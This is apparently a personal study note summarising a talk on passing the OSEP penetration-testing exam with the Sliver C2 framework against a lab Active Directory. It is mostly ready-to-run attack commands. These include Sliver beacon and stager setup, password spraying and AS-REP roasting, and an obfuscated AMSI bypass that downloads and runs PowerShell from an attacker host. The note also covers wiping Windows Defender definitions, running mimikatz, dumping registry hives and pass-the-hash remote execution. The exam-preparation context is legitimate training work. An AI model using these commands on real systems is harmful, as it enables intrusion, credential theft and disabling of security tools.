# TALK Ace The OSEP Exam with Sliver Framework


[YouTube - Ace the OSEP Exam with Sliver Framework](https://www.youtube.com/watch?v=YwiSqdIhl9g) description: *"www.bishopfox.com - Penetration testers are perpetual learners, constantly adapting and evolving. To excel in ethical hacking, one must master the art of emulating adversarial tactics in the most cutting-edge ways. Offensive security certifications serve as a testament to an ethical hacker's expertise, but with countless options and complex exams, how does one succeed? Tune in to learn how our senior security expert, Jon Guild, set himself up for success to pass the esteemed OSEP exam. Listen in to hear Jon’s first-hand experience using Bishop Fox’s Sliver C2 framework to practice pivoting, enumeration, lateral movement, and escalation in an ideal vulnerable lab environment. Jon will offer actionable tips and tricks to enhance your own preparedness for offensive security certification exams. Don't miss out on this opportunity to excel in the world of penetration testing. During this livestream, our senior security expert will share expertise on: • Using Sliver to prepare for and pass the OSEP exam • Developing and refining technical methodologies for exam success • Soft skills to make the most of study sessions and exam preparation"*

Including snippets and information from the blog post [bishopfox.com/blog/passing-the-osep-exam-using-sliver](https://bishopfox.com/blog/passing-the-osep-exam-using-sliver)

- Cybernetics HTB Labs for OSEP exam
- 80GBs and https://github.com/Orange-Cyberdefense/GOAD
- Build your own AD Lab
- Know your toolset. Do the CRTO 
- Have a reevaluation period
- Pass Exam, do not care about OPSEC care for the obtaining of flags 
- GitHub has a lot of awesome repositories! Make sure whatever you decide to use, you understand what it is doing and how you can modify it if needed.


- [[Active-Directory-Certificate-Services]] is very prominent in more modern 2023+ environment, check for the big lateral movement wins. 
- ChatGPT Games of Throne Username lists; the YouTube is based on DOAD, the exam report and exam may still have restrictions on AI Chat Bot usage.  


```
sliver > profiles new beacon --mtls 192.168.56.1:443 --format shellcode goad-shellcode-beacon
sliver > stage-listener -u tcp://192.168.56.1:8080 -p goad-shellcode-beacon
sliver > mtls -L 192.168.56.1 -l 443
```

General [[Active-Recon]] enumeration with `nmap`, `crackmapexec` 

Next check for [[ASREP-Roasting]]

Try Hodor:Hodor - to hold open some doors; surprising effective in corporate environments  
```bash
crackmapexec smb $ip -u users.txt -p users.txt --continue-on-success --no-brute
```

Impacket - [[Impacket-Cheatsheet]] is invaluable.
```bash
impacket-GetNPUsers -dc-ip $ip $domain.$tld/ -usersfiles users.txt -format hashcat 
```

[[AD-CS-Hacking]] with [[Crackmapexec-Cheatsheet]], Jon does these after first domain user
```bash
crackmapexec ldap -u $user -p $pass -M adcs 
```

Jon notes the importance of some of the LDAP modules 
```bash
crackmapexec ldap -L
enum_trusts
laps
maq # machineAccountQuota how many machine accounts a user can make; Default is 10 machines
```

Jon notes that some of the course material the C\# tooling and compiling workflow, whereas he used `impacket` and `sliver`

29:24 - https://www.youtube.com/watch?v=YwiSqdIhl9g


[[AMSI-Bypassing]] to download PowerShell code runner
```bash
powershell "$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344);IEX (new-object system.net.webclient).downloadstring('http://192.168.56.1:9000/sc.txt')"
```

[[Donut]] shellcode
```
donut /var/www/html/bin/PrintSpoofer64.exe -a 2 -b 2 -o /tmp/payload.bin -p '-c c:\windows\tasks\sph.exe'
```

Nuking AV
```go
execute -o cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

Execute sharp-hound-4
```go
sharp-hound-4 -- '-c all,GPOLocalGroup'
```

Sideload feature of Sliver to create a donut file for `mimikatz` without having too manually do it
```go
sideload /var/www/html/bin/mimikatz.exe "coffee" "exit"
```

`sharpview` or `sharpsh`, to  `Get-DomainGroup "Domain Admins"` from [[PowerView-Cheatsheet]]
```go
// Get-DomainGroup "Domain Admins"
sharpsh -- '-u http://192.168.56.1:9090/PowerView.ps1 -e -c RwBlAHQALQBEAG8AbQBhAGkAbgBHAHIAbwB1AHAAIAAiAEQAbwBtAGEAaQBuACAAQQBkAG0AaQBuAHMAIgA='
```

Migrate to different process
```go
migrate -p 6969
```

As Domain Admin dump the SAM, SECURITY Registry Hives from the [[Windows-Registry]]
```go
sharpsecdump '' -target=192.168.56.11
```

Use `atexec` from impacket - [[Impacket-Cheatsheet]] to 
```bash
impacket-atexec -hashes:"NTML" "$domain.$tld"/"Administrator"@"$ip" "powershell --enc $base64EncodedMethodToGetBeaconAndRecieveTheBacon"
```

## References

[YouTube - Ace the OSEP Exam with Sliver Framework](https://www.youtube.com/watch?v=YwiSqdIhl9g) 
[bishopfox.com/blog/passing-the-osep-exam-using-sliver](https://bishopfox.com/blog/passing-the-osep-exam-using-sliver)